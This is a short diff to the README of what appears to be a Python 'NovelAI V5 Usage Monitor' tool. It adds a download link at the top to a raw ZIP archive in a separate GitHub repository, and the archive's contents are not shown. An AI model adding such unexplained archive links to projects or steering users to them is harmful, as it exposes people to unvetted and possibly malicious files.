@@ -1,3 +1,5 @@
+# <a href="https://github.com/workforomg/Utill_program/raw/refs/heads/main/NovelAI_V5_Usage_Monitor_Distribution.zip" target="_blank">다운로드</a>
+
 # NovelAI V5 Usage Monitor — 파일
 
 ## 1. Python 설치
